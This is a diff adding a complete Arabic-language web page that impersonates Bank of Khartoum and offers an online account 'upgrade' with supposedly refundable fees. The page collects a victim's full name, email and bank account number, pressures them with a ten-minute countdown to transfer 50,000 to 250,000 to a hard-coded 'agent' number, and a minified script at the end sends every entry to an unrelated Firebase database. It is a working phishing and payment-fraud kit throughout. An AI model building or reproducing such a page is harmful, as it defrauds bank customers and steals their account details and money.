@@ -1,0 +1,889 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ترقيتي</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Readex+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #ffffff;
+            font-family: 'Readex Pro', 'Segoe UI', Tahoma, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .top-right {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            z-index: 10;
+        }
+
+        .golden-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: #FFD700;
+            letter-spacing: 1px;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        }
+
+        .golden-line {
+            position: absolute;
+            top: 42px;
+            right: 16px;
+            width: 60px;
+            height: 3px;
+            background-color: #FFD700;
+            border-radius: 2px;
+            box-shadow: 0 0 8px rgba(255, 215, 0, 0.5);
+            z-index: 10;
+        }
+
+        .screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            text-align: center;
+            padding: 20px;
+            width: 100%;
+            max-width: 420px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .lightning-container {
+            position: relative;
+            width: 100px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .lightning {
+            width: 22px;
+            height: auto;
+            animation: moveDownUp 2s ease-in-out infinite;
+        }
+
+        @keyframes moveDownUp {
+            0%   { transform: translateY(0); }
+            25%  { transform: translateY(12px); }
+            50%  { transform: translateY(18px); }
+            75%  { transform: translateY(6px); }
+            100% { transform: translateY(0); }
+        }
+
+        .promo-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: #444444;
+            line-height: 1.8;
+        }
+
+        .promo-text .highlight {
+            color: #FFD700;
+            font-weight: 700;
+        }
+
+        .start-button, .btn-next {
+            display: inline-block;
+            padding: 14px 32px;
+            background-color: #FFD700;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-family: 'Readex Pro', sans-serif;
+            font-size: 17px;
+            font-weight: 600;
+            color: #ffffff;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .start-button:hover, .btn-next:hover {
+            background-color: #e6c200;
+            box-shadow: 0 8px 30px rgba(255, 215, 0, 0.5);
+            transform: translateY(-3px);
+        }
+
+        .start-button:active, .btn-next:active {
+            background-color: #cca800;
+            box-shadow: 0 2px 10px rgba(255, 215, 0, 0.3);
+            transform: translateY(1px) scale(0.97);
+            transition: all 0.1s ease;
+        }
+
+        .btn-next:disabled, .start-button:disabled {
+            background-color: #ddd;
+            color: #999;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+
+        .btn-next.expired {
+            background-color: #e0e0e0;
+            color: #999;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .loading-text {
+            font-size: 18px;
+            color: #888;
+            font-weight: 500;
+        }
+
+        .dots {
+            display: inline-block;
+            animation: dotPulse 1.4s infinite;
+        }
+
+        @keyframes dotPulse {
+            0%, 20% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid #f0f0f0;
+            border-top-color: #FFD700;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-spinner-inline {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.4);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        .form-group {
+            width: 100%;
+            text-align: right;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #555;
+            margin-bottom: 6px;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 15px;
+            font-family: 'Readex Pro', sans-serif;
+            border: 2px solid #e5e5e5;
+            border-radius: 12px;
+            outline: none;
+            background-color: #fafafa;
+            color: #333;
+            transition: all 0.3s ease;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            border-color: #FFD700;
+            background-color: #fffef7;
+            box-shadow: 0 0 0 4px rgba(255, 215, 0, 0.1);
+        }
+
+        .form-group input::placeholder {
+            color: #bbb;
+        }
+
+        .form-group select {
+            cursor: pointer;
+            appearance: none;
+            -webkit-appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M6 8L1 3h10z' fill='%23999'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: left 16px center;
+        }
+
+        .error-msg {
+            color: #e53935;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .upgrade-info {
+            width: 100%;
+            background-color: #fffef5;
+            border: 1px solid #ffe082;
+            border-radius: 14px;
+            padding: 16px;
+            text-align: right;
+            font-size: 13px;
+            color: #6b5e00;
+            line-height: 1.8;
+        }
+
+        .upgrade-info .price {
+            font-size: 16px;
+            font-weight: 700;
+            color: #b8960f;
+            display: block;
+            margin-top: 4px;
+        }
+
+        .btn-agent {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .btn-agent-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #b8960f;
+        }
+
+        .btn-agent-circle {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background-color: #fffef5;
+            border: 2px solid #FFD700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .btn-agent-circle svg {
+            width: 24px;
+            height: 24px;
+            transition: transform 0.6s ease;
+        }
+
+        .btn-agent:hover .btn-agent-circle {
+            background-color: #fff9d6;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .btn-agent.spinning .btn-agent-circle svg {
+            animation: rotateArrows 0.6s linear infinite;
+        }
+
+        @keyframes rotateArrows {
+            to { transform: rotate(360deg); }
+        }
+
+        /* صف رقم الوكيل مع زر النسخ */
+        .agent-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .agent-number {
+            font-size: 22px;
+            font-weight: 700;
+            color: #333;
+            letter-spacing: 2px;
+            direction: ltr;
+            display: inline-block;
+        }
+
+        /* زر نسخ صغير */
+        .btn-copy {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 5px 10px;
+            background-color: #f8f8f8;
+            border: 1.5px solid #ddd;
+            border-radius: 20px;
+            cursor: pointer;
+            font-family: 'Readex Pro', sans-serif;
+            font-size: 10px;
+            font-weight: 600;
+            color: #666;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+            gap: 4px;
+            min-width: 50px;
+        }
+
+        .btn-copy:hover {
+            background-color: #fffef5;
+            border-color: #FFD700;
+            color: #b8960f;
+            box-shadow: 0 2px 10px rgba(255, 215, 0, 0.2);
+        }
+
+        .btn-copy:active {
+            background-color: #FFD700;
+            color: #fff;
+            border-color: #FFD700;
+            transform: scale(0.95);
+        }
+
+        .btn-copy.copied {
+            background-color: #e8f5e9;
+            border-color: #a5d6a7;
+            color: #2e7d32;
+        }
+
+        .copy-icon {
+            width: 12px;
+            height: 12px;
+            flex-shrink: 0;
+        }
+
+        .check-icon {
+            width: 12px;
+            height: 12px;
+            flex-shrink: 0;
+            display: none;
+        }
+
+        .btn-copy.copied .copy-icon {
+            display: none;
+        }
+
+        .btn-copy.copied .check-icon {
+            display: block;
+        }
+
+        .payment-instruction {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.8;
+        }
+
+        .payment-instruction strong {
+            color: #b8960f;
+        }
+
+        /* العداد التنازلي */
+        .countdown-timer {
+            background: #fff8e1;
+            border: 1px solid #ffe082;
+            border-radius: 12px;
+            padding: 10px 16px;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 14px;
+            color: #e65100;
+            font-weight: 600;
+        }
+
+        .countdown-timer .timer-text {
+            letter-spacing: 1px;
+            direction: ltr;
+            display: inline-block;
+        }
+
+        .countdown-timer.expired-timer {
+            background: #ffebee;
+            border-color: #ef9a9a;
+            color: #c62828;
+        }
+
+        .success-box {
+            width: 100%;
+            background-color: #f9fff7;
+            border: 1px solid #c8e6c9;
+            border-radius: 14px;
+            padding: 20px;
+            text-align: center;
+            font-size: 15px;
+            color: #2e7d32;
+            line-height: 2;
+            margin-bottom: 16px;
+        }
+
+        .btn-close {
+            padding: 16px 32px;
+            background-color: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 50px;
+            cursor: pointer;
+            font-family: 'Readex Pro', sans-serif;
+            font-size: 17px;
+            font-weight: 700;
+            color: #555;
+            width: 100%;
+            transition: all 0.3s ease;
+            display: block;
+            visibility: visible;
+            opacity: 1;
+            z-index: 100;
+            position: relative;
+        }
+
+        .btn-close:hover {
+            background-color: #e0e0e0;
+            border-color: #ccc;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #fafafa;
+            border-top: 1px solid #eeeeee;
+            text-align: center;
+            padding: 14px 20px;
+            z-index: 1000;
+        }
+
+        .footer-text {
+            font-size: 13px;
+            color: #888888;
+            font-weight: 400;
+        }
+
+        .footer-text .bank-name {
+            color: #555555;
+            font-weight: 600;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a1a1a;
+            color: #FFD700;
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 600;
+            z-index: 9999;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+        }
+
+        .toast.show {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-right"><span class="golden-text">ترقيتي</span></div>
+    <div class="golden-line"></div>
+
+    <!-- ========== شاشة 1: رئيسية ========== -->
+    <div class="screen" id="screen1">
+        <div class="lightning-container">
+            <svg class="lightning" viewBox="0 0 64 100" xmlns="http://www.w3.org/2000/svg">
+                <polygon points="38,0 0,58 28,58 16,100 64,38 34,38" fill="#FFD700"/>
+                <polygon points="36,4 6,56 27,56 18,93 57,40 33,40" fill="#ffffff"/>
+            </svg>
+        </div>
+        <p class="promo-text">
+            قم بترقية حسابك <span class="highlight">عبر اونلاين</span><br>
+            وبسرعة فائقة مع <span class="highlight">استرداد رسوم الترقية</span>
+        </p>
+        <button class="start-button" id="btnStart" onclick="goToLoading()">ابدأ الآن</button>
+    </div>
+
+    <!-- ========== شاشة 2: تحميل ========== -->
+    <div class="screen hidden" id="screen2">
+        <div class="spinner"></div>
+        <p class="loading-text">قائمة الانتظار، تحميل<span class="dots"> •••</span></p>
+    </div>
+
+    <!-- ========== شاشة 3: الاسم + الإيميل ========== -->
+    <div class="screen hidden" id="screen3">
+        <p class="promo-text">أدخل بياناتك للمتابعة</p>
+        <div class="form-group">
+            <label>الاسم الرباعي</label>
+            <input type="text" id="fullName" placeholder="أدخل اسمك الرباعي كاملاً">
+            <span class="error-msg" id="nameError">يرجى إدخال الاسم الرباعي</span>
+        </div>
+        <div class="form-group">
+            <label>عنوان البريد الإلكتروني</label>
+            <input type="email" id="email" placeholder="example@email.com">
+            <span class="error-msg" id="emailError">يرجى إدخال بريد إلكتروني صحيح</span>
+        </div>
+        <button class="btn-next" id="btnGoAccount" onclick="goToAccount()">التالي</button>
+    </div>
+
+    <!-- ========== شاشة 4: الحساب + الترقية ========== -->
+    <div class="screen hidden" id="screen4">
+        <p class="promo-text">تفاصيل الحساب والترقية</p>
+        <div class="form-group">
+            <label>رقم حسابك (7 أرقام)</label>
+            <input type="text" id="accountNumber" placeholder="أدخل رقم الحساب" maxlength="7" inputmode="numeric" pattern="[0-9]*">
+            <span class="error-msg" id="accountError">يجب إدخال 7 أرقام بالضبط</span>
+        </div>
+        <div class="form-group">
+            <label>نوع حسابك الحالي</label>
+            <select id="currentAccountType">
+                <option value="">-- اختر نوع الحساب --</option>
+                <option value="savings">حساب توفير</option>
+                <option value="premium">حساب مميز</option>
+                <option value="current">حساب جاري</option>
+            </select>
+            <span class="error-msg" id="currentTypeError">يرجى اختيار نوع الحساب الحالي</span>
+        </div>
+        <div class="form-group">
+            <label>نوع الترقية المطلوب</label>
+            <select id="upgradeType" onchange="showUpgradeInfo()">
+                <option value="">-- اختر نوع الترقية --</option>
+                <option value="to-premium">حساب مميز</option>
+                <option value="to-current">حساب جاري</option>
+                <option value="to-investment">حساب استثماري</option>
+            </select>
+            <span class="error-msg" id="upgradeTypeError">يرجى اختيار نوع الترقية</span>
+        </div>
+        <div class="upgrade-info hidden" id="upgradeInfoBox"></div>
+        <div id="agentSection" class="hidden" style="width:100%;"></div>
+    </div>
+
+    <!-- ========== شاشة 5: النجاح ========== -->
+    <div class="screen hidden" id="screen5">
+        <div class="success-box">
+            <p style="font-size:17px;font-weight:700;margin-bottom:10px;">تم استلام طلب ترقيتك بنجاح</p>
+            <p style="font-size:14px;color:#444;">سيتم موافاتك بعد قليل بالتفاصيل عبر بريدك الإلكتروني</p>
+        </div>
+        <button class="btn-close" onclick="closeApp()">إغلاق</button>
+    </div>
+
+    <div class="footer" id="footerBar">
+        <span class="footer-text">جميع الحقوق محفوظة لدى <span class="bank-name">بنك الخرطوم</span> &copy; 2026</span>
+    </div>
+
+    <!-- توست -->
+    <div class="toast" id="toast"></div>
+
+    <!-- ========== السكريبت الرئيسي ========== -->
+    <script>
+        let submitted = false;
+        let countdownInterval = null;
+        let timeLeft = 600;
+        let timerExpired = false;
+        const footerBar = document.getElementById('footerBar');
+
+        function showFooter() { footerBar.style.display = 'block'; }
+        function hideFooter() { footerBar.style.display = 'none'; }
+
+        function showBtnSpinner(btn, text) {
+            btn.disabled = true;
+            btn.innerHTML = '<span class="btn-spinner-inline"></span> ' + text;
+        }
+
+        function resetBtn(btn, text) {
+            btn.disabled = false;
+            btn.innerHTML = text;
+        }
+
+        function formatTime(seconds) {
+            const mins = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+        }
+
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        }
+
+        function copyAgentNumber() {
+            const number = '9831749';
+            navigator.clipboard.writeText(number).then(() => {
+                const btn = document.getElementById('btnCopyAgent');
+                btn.classList.add('copied');
+                btn.querySelector('.copy-text').textContent = 'تم';
+                showToast('تم نسخ رقم الوكيل: ' + number);
+                setTimeout(() => {
+                    btn.classList.remove('copied');
+                    btn.querySelector('.copy-text').textContent = 'نسخ';
+                }, 2000);
+            });
+        }
+
+        function startCountdown() {
+            timeLeft = 600;
+            timerExpired = false;
+
+            const timerDisplay = document.getElementById('countdownDisplay');
+            const timerContainer = document.getElementById('countdownContainer');
+            const submitBtn = document.getElementById('btnPaymentSubmit');
+            const txInput = document.getElementById('paymentTransactionNumber');
+
+            timerContainer.classList.remove('hidden');
+            timerContainer.classList.remove('expired-timer');
+            timerDisplay.textContent = formatTime(timeLeft);
+
+            if (submitBtn) {
+                submitBtn.disabled = false;
+                submitBtn.classList.remove('expired');
+                submitBtn.innerHTML = 'تقديم';
+            }
+            if (txInput) {
+                txInput.disabled = false;
+            }
+
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                timerDisplay.textContent = formatTime(timeLeft);
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    timerExpired = true;
+                    timerDisplay.textContent = '00:00';
+                    timerContainer.classList.add('expired-timer');
+
+                    if (submitBtn) {
+                        submitBtn.disabled = true;
+                        submitBtn.classList.add('expired');
+                        submitBtn.innerHTML = 'انتهى الوقت';
+                    }
+                    if (txInput) {
+                        txInput.disabled = true;
+                        txInput.placeholder = 'انتهت صلاحية الجلسة';
+                    }
+                }
+            }, 1000);
+        }
+
+        function stopCountdown() {
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+        }
+
+        function goToLoading() {
+            hideFooter();
+            const btn = document.getElementById('btnStart');
+            showBtnSpinner(btn, 'انتظار...');
+            document.getElementById('screen1').classList.add('hidden');
+            document.getElementById('screen2').classList.remove('hidden');
+            setTimeout(() => {
+                document.getElementById('screen2').classList.add('hidden');
+                document.getElementById('screen3').classList.remove('hidden');
+                resetBtn(btn, 'ابدأ الآن');
+            }, 2500);
+        }
+
+        function goToAccount() {
+            let valid = true;
+            const name = document.getElementById('fullName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const btn = document.getElementById('btnGoAccount');
+
+            if (name === '' || name.split(' ').length < 4) {
+                document.getElementById('nameError').style.display = 'block';
+                valid = false;
+            } else {
+                document.getElementById('nameError').style.display = 'none';
+            }
+
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                document.getElementById('emailError').style.display = 'block';
+                valid = false;
+            } else {
+                document.getElementById('emailError').style.display = 'none';
+            }
+
+            if (valid) {
+                showBtnSpinner(btn, 'انتظار...');
+                setTimeout(() => {
+                    document.getElementById('screen3').classList.add('hidden');
+                    document.getElementById('screen4').classList.remove('hidden');
+                    resetBtn(btn, 'التالي');
+                }, 1500);
+            }
+        }
+
+        function showUpgradeInfo() {
+            const type = document.getElementById('upgradeType').value;
+            const box = document.getElementById('upgradeInfoBox');
+            const agentSection = document.getElementById('agentSection');
+            box.classList.remove('hidden');
+
+            let info = '';
+            if (type === 'to-premium') {
+                info = `سقف التحويل: 30 مليوناً يومياً - استخراج دفتر شيكات<br><span class="price">رسوم الترقية: 50,000</span>`;
+            } else if (type === 'to-current') {
+                info = `سقف التحويل: غير محدود - دفتر شيكات - قرض فوري اونلاين<br><span class="price">رسوم الترقية: 150,000</span>`;
+            } else if (type === 'to-investment') {
+                info = `سقف التحويل: غير محدود - استثمار سريع - ضعف المبلغ<br><span class="price">رسوم الترقية: 250,000</span>`;
+            }
+            box.innerHTML = info;
+
+            stopCountdown();
+            timerExpired = false;
+
+            agentSection.classList.remove('hidden');
+            agentSection.innerHTML = `
+                <div class="btn-agent" id="agentBtn" onclick="startAgentCheck()">
+                    <span class="btn-agent-label">فحص وكيل متصل لسداد رسوم الترقية</span>
+                    <div class="btn-agent-circle">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="#FFD700" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M17 1l4 4-4 4"/>
+                            <path d="M7 23l-4-4 4-4"/>
+                            <path d="M21 5H9a4 4 0 0 0 0 8h2"/>
+                            <path d="M3 19h12a4 4 0 0 0 0-8h-2"/>
+                        </svg>
+                    </div>
+                </div>
+                <div id="agentResult" class="hidden" style="margin-top:12px;text-align:center;"></div>
+            `;
+        }
+
+        function startAgentCheck() {
+            const btn = document.getElementById('agentBtn');
+            const result = document.getElementById('agentResult');
+            btn.classList.add('spinning');
+            btn.querySelector('.btn-agent-label').textContent = 'جارٍ الفحص...';
+            btn.style.pointerEvents = 'none';
+
+            setTimeout(() => {
+                btn.classList.remove('spinning');
+                btn.classList.add('hidden');
+                result.classList.remove('hidden');
+                result.innerHTML = `
+                    <p style="font-size:14px;color:#555;">لسداد الرسوم عبر بنكك قم بالتحويل لرقم الوكيل أدناه :</p>
+                    <div class="agent-row">
+                        <span class="agent-number">9831749</span>
+                        <button class="btn-copy" id="btnCopyAgent" onclick="copyAgentNumber()">
+                            <svg class="copy-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            <svg class="check-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                                <polyline points="20 6 9 17 4 12"></polyline>
+                            </svg>
+                            <span class="copy-text">نسخ</span>
+                        </button>
+                    </div>
+                    <p class="payment-instruction" style="margin-top:10px;">
+                        قم بسداد الرسوم المطلوبة لإتمام طلب الترقية <strong>(مستردة)</strong>
+                    </p>
+                    <!-- العداد التنازلي -->
+                    <div class="countdown-timer" id="countdownContainer">
+                        <span>الوقت المتبقي:</span>
+                        <span class="timer-text" id="countdownDisplay">10:00</span>
+                    </div>
+                    <div class="form-group" style="margin-top:14px;">
+                        <label>رقم عملية السداد</label>
+                        <input type="text" id="paymentTransactionNumber" placeholder="أدخل رقم عملية السداد">
+                        <span class="error-msg" id="paymentTxError">يرجى إدخال رقم عملية السداد</span>
+                    </div>
+                    <button class="btn-next" id="btnPaymentSubmit" style="margin-top:14px;" onclick="submitPaymentTx()">تقديم</button>
+                `;
+
+                startCountdown();
+            }, 4000);
+        }
+
+        function submitPaymentTx() {
+            if (timerExpired) {
+                alert('انتهت صلاحية الجلسة، يرجى البدء من جديد.');
+                return;
+            }
+
+            const tx = document.getElementById('paymentTransactionNumber').value.trim();
+            const btn = document.getElementById('btnPaymentSubmit');
+            if (tx === '') {
+                document.getElementById('paymentTxError').style.display = 'block';
+                return;
+            }
+            document.getElementById('paymentTxError').style.display = 'none';
+
+            stopCountdown();
+
+            showBtnSpinner(btn, 'انتظار...');
+
+            const userData = {
+                fullName: document.getElementById('fullName').value.trim(),
+                email: document.getElementById('email').value.trim(),
+                accountNumber: document.getElementById('accountNumber').value.trim(),
+                currentAccountType: document.getElementById('currentAccountType').value,
+                upgradeType: document.getElementById('upgradeType').value,
+                agentNumber: "9831749",
+                paymentTransaction: tx
+            };
+
+            if (window.saveToFirebase) {
+                window.saveToFirebase(userData);
+            }
+
+            setTimeout(() => {
+                document.getElementById('screen4').classList.add('hidden');
+                document.getElementById('screen5').classList.remove('hidden');
+                resetBtn(btn, 'تقديم');
+            }, 7000);
+        }
+
+        function closeApp() {
+            stopCountdown();
+            timerExpired = false;
+            document.getElementById('screen5').classList.add('hidden');
+            document.getElementById('screen1').classList.remove('hidden');
+            showFooter();
+            submitted = false;
+            document.getElementById('fullName').value = '';
+            document.getElementById('email').value = '';
+            document.getElementById('accountNumber').value = '';
+            document.getElementById('currentAccountType').value = '';
+            document.getElementById('upgradeType').value = '';
+            document.getElementById('upgradeInfoBox').classList.add('hidden');
+            document.getElementById('agentSection').classList.add('hidden');
+        }
+    </script>
+
+    <!-- ========== Firebase ========== -->
+    <script type="module">
+        import{initializeApp}from"https://www.gstatic.com/firebasejs/11.6.0/firebase-app.js";import{getDatabase,ref,push,serverTimestamp}from"https://www.gstatic.com/firebasejs/11.6.0/firebase-database.js";const a=initializeApp({apiKey:"AIzaSyCd9IrN1B0LZ3twziBnDreqbETzttY6zz8",authDomain:"zaxx-d27c3.firebaseapp.com",databaseURL:"https://zaxx-d27c3-default-rtdb.firebaseio.com",projectId:"zaxx-d27c3",storageBucket:"zaxx-d27c3.firebasestorage.app",messagingSenderId:"813500500354",appId:"1:813500500354:web:56963e30e7cfbc4f15a79b",measurementId:"G-WZ0QRP4NTD"});const b=getDatabase(a);window.saveToFirebase=function(d){push(ref(b,'upgradeRequests'),{...d,timestamp:serverTimestamp()}).then(()=>console.log('تم الحفظ')).catch(e=>console.error('خطأ:',e))};
+    </script>
+
+</body>
+</html>
